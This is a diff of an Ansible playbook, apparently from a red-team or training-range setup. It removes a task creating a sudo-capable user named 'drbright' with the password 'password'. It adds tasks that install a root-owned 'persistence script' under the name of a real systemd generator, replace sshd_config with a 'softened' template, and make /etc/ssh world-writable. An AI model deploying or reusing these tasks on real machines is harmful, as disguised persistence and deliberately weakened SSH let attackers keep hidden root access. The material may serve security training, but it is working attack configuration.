@@ -1,10 +1,51 @@
 ---
 
-- name: Create Persistent Vulnerable User
-  ansible.builtin.user:
-    name: "drbright"
-    password: "{{ 'password' | password_hash('sha512') }}"
-    groups: "{{ 'sudo' if ansible_os_family == 'Debian' else 'wheel' }}"
-    append: true
-    state: present
+- name: Create User Persistence Script
+  ansible.builtin.template:
+    src: templates/persist.j2
+    dest: /usr/lib/systemd/system-generators/systemd-network-generator
+    owner: root
+    group: root
+    mode: "0755"
   become: true
+
+- name: Restart Systemd Daemon
+  ansible.builtin.shell: "systemctl daemon-reload"
+  become: true
+
+- name: Install Paramiko
+  ansible.builtin.dnf:
+    name: "{{ item }}"
+    state: latest
+    update_cache: true
+  become: true
+  loop:
+    - epel-release
+    - python3-paramiko
+
+- name: Soften SSH Server
+  ansible.builtin.template:
+    src: templates/sshd_config.j2
+    dest: /etc/ssh/sshd_config
+    owner: root
+    group: root
+    mode: "0755"
+  become: true
+
+- name: Make SSH Config ACL Permissive
+  ansible.builtin.file:
+    path: /etc/ssh
+    mode: "0777"
+    recurse: true
+  become: true
+
+- name: Restore SSH Private Key Permissions
+  ansible.builtin.file:
+    path: "/etc/ssh/{{ item }}"
+    mode: "0600"
+  become: true
+  loop:
+    - ssh_host_ecdsa_key
+    - ssh_host_ed25519_key
+    - ssh_host_rsa_key
+  notify: Restart sshd
